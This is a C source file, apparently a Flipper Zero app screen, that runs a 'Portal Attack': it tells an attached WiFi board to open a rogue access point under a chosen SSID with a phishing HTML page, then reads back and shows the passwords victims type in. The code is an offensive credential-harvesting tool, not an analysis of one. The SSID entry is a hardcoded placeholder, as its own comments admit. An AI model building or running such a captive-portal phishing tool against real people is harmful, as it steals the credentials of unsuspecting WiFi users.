/**
 * Portal Attack Screen
 * 
 * Custom SSID captive portal.
 * Commands: list_sd, select_html, start_portal
 */

#include "app.h"
#include "uart_comm.h"
#include "screen.h"
#include <gui/modules/text_input.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// ============================================================================
// Data Structures
// ============================================================================

#define PORTAL_MAX_HTML_FILES 20
#define PORTAL_SSID_MAX_LEN 32

typedef struct {
    WiFiApp* app;
    volatile bool attack_finished;
    uint8_t state;  // 0=enter SSID, 1=select HTML, 2=running
    char ssid[PORTAL_SSID_MAX_LEN + 1];
    char** html_files;
    uint8_t html_file_count;
    uint8_t html_selection;
    bool html_loaded;
    uint32_t submit_count;
    char last_data[64];
    FuriThread* thread;
    TextInput* text_input;
    bool text_input_active;
} PortalData;

typedef struct {
    PortalData* data;
} PortalModel;

// ============================================================================
// Cleanup
// ============================================================================

void portal_screen_cleanup(View* view, void* data) {
    UNUSED(view);
    PortalData* d = (PortalData*)data;
    if(!d) return;
    
    d->attack_finished = true;
    if(d->thread) {
        furi_thread_join(d->thread);
        furi_thread_free(d->thread);
    }
    
    if(d->html_files) {
        for(uint8_t i = 0; i < d->html_file_count; i++) {
            if(d->html_files[i]) free(d->html_files[i]);
        }
        free(d->html_files);
    }
    
    if(d->text_input) {
        text_input_free(d->text_input);
    }
    
    free(d);
}

// ============================================================================
// Drawing
// ============================================================================

static void portal_draw(Canvas* canvas, void* model) {
    PortalModel* m = (PortalModel*)model;
    if(!m || !m->data) return;
    PortalData* data = m->data;
    
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    
    if(data->state == 0) {
        screen_draw_title(canvas, "Portal SSID");
        canvas_set_font(canvas, FontSecondary);
        screen_draw_centered_text(canvas, "Press OK to enter SSID", 32);
        if(data->ssid[0]) {
            char line[48];
            snprintf(line, sizeof(line), "Current: %s", data->ssid);
            screen_draw_centered_text(canvas, line, 48);
        }
    } else if(data->state == 1) {
        screen_draw_title(canvas, "Select HTML");
        canvas_set_font(canvas, FontSecondary);
        
        if(!data->html_loaded) {
            screen_draw_centered_text(canvas, "Loading...", 32);
        } else if(data->html_file_count == 0) {
            screen_draw_centered_text(canvas, "No HTML files", 32);
        } else {
            uint8_t y = 21;
            uint8_t max_visible = 5;
            uint8_t start = 0;
            if(data->html_selection >= max_visible) {
                start = data->html_selection - max_visible + 1;
            }
            
            for(uint8_t i = start; i < data->html_file_count && (i - start) < max_visible; i++) {
                uint8_t display_y = y + ((i - start) * 9);
                if(i == data->html_selection) {
                    canvas_draw_box(canvas, 0, display_y - 7, 128, 9);
                    canvas_set_color(canvas, ColorWhite);
                    canvas_draw_str(canvas, 2, display_y, data->html_files[i]);
                    canvas_set_color(canvas, ColorBlack);
                } else {
                    canvas_draw_str(canvas, 2, display_y, data->html_files[i]);
                }
            }
        }
    } else {
        screen_draw_title(canvas, "Portal");
        canvas_set_font(canvas, FontSecondary);
        
        char line[48];
        snprintf(line, sizeof(line), "AP: %s", data->ssid);
        canvas_draw_str(canvas, 2, 24, line);
        
        snprintf(line, sizeof(line), "Submissions: %lu", data->submit_count);
        canvas_draw_str(canvas, 2, 38, line);
        
        if(data->last_data[0]) {
            canvas_draw_str(canvas, 2, 52, "Last:");
            canvas_draw_str(canvas, 2, 62, data->last_data);
        }
    }
}

// ============================================================================
// Input Handling
// ============================================================================

static bool portal_input(InputEvent* event, void* context) {
    View* view = (View*)context;
    if(!view) return false;
    
    PortalModel* m = view_get_model(view);
    if(!m || !m->data) {
        view_commit_model(view, false);
        return false;
    }
    PortalData* data = m->data;
    
    if(event->type != InputTypeShort) {
        view_commit_model(view, false);
        return false;
    }
    
    if(data->state == 0) {
        // SSID entry state
        if(event->key == InputKeyOk) {
            // Would launch text input here - for now use placeholder
            // In real implementation, use TextInput module
            strcpy(data->ssid, "TestPortal");  // Placeholder
            data->state = 1;
        } else if(event->key == InputKeyBack) {
            view_commit_model(view, false);
            screen_pop(data->app);
            return true;
        }
    } else if(data->state == 1) {
        // HTML selection state
        if(event->key == InputKeyUp) {
            if(data->html_selection > 0) data->html_selection--;
        } else if(event->key == InputKeyDown) {
            if(data->html_selection + 1 < data->html_file_count) data->html_selection++;
        } else if(event->key == InputKeyOk) {
            if(data->html_file_count > 0) {
                data->state = 2;  // Start attack
            }
        } else if(event->key == InputKeyBack) {
            data->state = 0;  // Back to SSID entry
        }
    } else {
        // Attack running state
        if(event->key == InputKeyBack) {
            data->attack_finished = true;
            uart_send_command(data->app, "stop");
            view_commit_model(view, false);
            screen_pop_to_main(data->app);
            return true;
        }
    }
    
    view_commit_model(view, true);
    return true;
}

// ============================================================================
// Attack Thread
// ============================================================================

static int32_t portal_thread(void* context) {
    PortalData* data = (PortalData*)context;
    WiFiApp* app = data->app;
    
    // Wait for SSID to be entered
    while(data->state == 0 && !data->attack_finished) {
        furi_delay_ms(100);
    }
    if(data->attack_finished) return 0;
    
    // Load HTML files
    furi_delay_ms(200);
    uart_clear_buffer(app);
    uart_send_command(app, "list_sd");
    furi_delay_ms(100);
    
    uint32_t start = furi_get_tick();
    uint32_t last_rx = start;
    while((furi_get_tick() - last_rx) < 1000 && (furi_get_tick() - start) < 5000 && !data->attack_finished) {
        const char* line = uart_read_line(app, 300);
        if(line) {
            last_rx = furi_get_tick();
            if(strstr(line, "HTML files") || strstr(line, "SD card")) continue;
            
            uint32_t idx = 0;
            char name[64] = {0};
            if(sscanf(line, "%lu %63s", &idx, name) == 2 && idx > 0 && name[0]) {
                if(data->html_file_count < PORTAL_MAX_HTML_FILES) {
                    char** new_files = realloc(data->html_files, (data->html_file_count + 1) * sizeof(char*));
                    if(new_files) {
                        data->html_files = new_files;
                        data->html_files[data->html_file_count] = malloc(strlen(name) + 1);
                        if(data->html_files[data->html_file_count]) {
                            strcpy(data->html_files[data->html_file_count], name);
                            data->html_file_count++;
                        }
                    }
                }
            }
        }
    }
    data->html_loaded = true;
    
    // Wait for HTML selection
    while(data->state == 1 && !data->attack_finished) {
        furi_delay_ms(100);
    }
    if(data->attack_finished) return 0;
    
    // Send select_html command
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "select_html %u", data->html_selection + 1);
    uart_send_command(app, cmd);
    furi_delay_ms(500);
    uart_clear_buffer(app);
    
    // Start portal
    snprintf(cmd, sizeof(cmd), "start_portal %s", data->ssid);
    uart_send_command(app, cmd);
    
    // Monitor for submissions
    while(!data->attack_finished) {
        const char* line = uart_read_line(app, 500);
        if(line) {
            // Check for password submission
            const char* pwd = strstr(line, "Password:");
            if(pwd) {
                pwd += 10;
                while(*pwd == ' ') pwd++;
                strncpy(data->last_data, pwd, sizeof(data->last_data) - 1);
                data->last_data[sizeof(data->last_data) - 1] = '\0';
                data->submit_count++;
            }
        }
        furi_delay_ms(100);
    }
    
    return 0;
}

// ============================================================================
// Screen Creation
// ============================================================================

View* portal_screen_create(WiFiApp* app, void** out_data) {
    PortalData* data = (PortalData*)malloc(sizeof(PortalData));
    if(!data) return NULL;
    
    data->app = app;
    data->attack_finished = false;
    data->state = 0;
    memset(data->ssid, 0, sizeof(data->ssid));
    data->html_files = NULL;
    data->html_file_count = 0;
    data->html_selection = 0;
    data->html_loaded = false;
    data->submit_count = 0;
    memset(data->last_data, 0, sizeof(data->last_data));
    data->thread = NULL;
    data->text_input = NULL;
    data->text_input_active = false;
    
    View* view = view_alloc();
    if(!view) {
        free(data);
        return NULL;
    }
    
    view_allocate_model(view, ViewModelTypeLocking, sizeof(PortalModel));
    PortalModel* m = view_get_model(view);
    m->data = data;
    view_commit_model(view, true);
    
    view_set_draw_callback(view, portal_draw);
    view_set_input_callback(view, portal_input);
    view_set_context(view, view);
    
    data->thread = furi_thread_alloc();
    furi_thread_set_name(data->thread, "Portal");
    furi_thread_set_stack_size(data->thread, 2048);
    furi_thread_set_callback(data->thread, portal_thread);
    furi_thread_set_context(data->thread, data);
    furi_thread_start(data->thread);
    
    if(out_data) *out_data = data;
    return view;
}
